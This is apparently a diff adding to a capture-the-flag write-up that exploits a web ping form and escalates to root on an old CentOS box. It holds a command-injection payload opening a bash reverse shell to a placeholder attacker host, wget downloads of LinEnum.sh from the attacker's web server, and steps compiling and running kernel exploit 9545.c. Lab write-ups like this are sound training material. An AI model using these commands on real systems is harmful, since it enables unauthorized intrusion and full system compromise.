@@ -64,8 +64,24 @@ I entered the machine IP into the box and it opens a new tab with the ping resul
  
  I entered `x.x.x.4 | bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1` into the website and we get reverse shell on our local machine as user apache
  
- Spawn a TTY shell using python -c 'import pty; pty.spawn("/bin/sh")' from (Netsec TTY Cheat Sheet)[https://netsec.ws/?p=337]
+ Spawn a TTY shell using `python -c 'import pty; pty.spawn("/bin/sh")'` from (Netsec TTY Cheat Sheet)[https://netsec.ws/?p=337]
  
 ### Privilege Escalation
  
-I started 
+I started a python web server `python3 -m http.server` in my directory containing LinEnum.sh
+
+`cd /tmp` and `wget http://x.x.x.49:8000/LinEnum.sh` to get the script onto the target and `chmod 700 LinEnum.sh` to be able to run it.
+
+This gets us important system information such as CentOS release 4.5 (Final) and Linux version 2.6.9-55
+
+`searchsploit linux kernel 2.6 centos` suggests we can use the `9545.c` exploit
+
+To upload to the target machine, we use the same python webserver method as before
+
+`gcc -o exploit 9545.c`
+
+`chmod 700 exploit`
+
+`./exploit`
+
+`uid=0(root) gid=0(root) groups=48(apache)` and we are root
